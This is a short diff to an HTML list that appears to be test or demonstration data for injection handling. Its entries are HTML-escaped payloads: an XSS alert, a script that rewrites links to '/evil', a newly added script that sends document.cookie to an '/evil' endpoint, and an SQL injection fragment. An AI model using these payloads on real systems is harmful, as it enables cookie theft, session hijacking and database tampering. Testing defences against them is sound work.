@@ -12,6 +12,7 @@
         <li> Facebook </li>
         <li> &lt;script&gt; alert(&quot;XSS!&quot;) &lt;/script&gt; </li>
         <li> Facebook &lt;script&gt; $(function(){$(&quot;a&quot;).attr(&quot;href&quot;, &quot;/evil&quot;);}); &lt;/script&gt; </li>
+        <li> &lt;script&gt; $.get(&quot;/evil?save=cookie&amp;cookie=&quot;+encodeURI(document.cookie)); &lt;/script&gt; </li>
         <li>aaa ' OR link LIKE 'http%</li>
     </ol>
 </div>
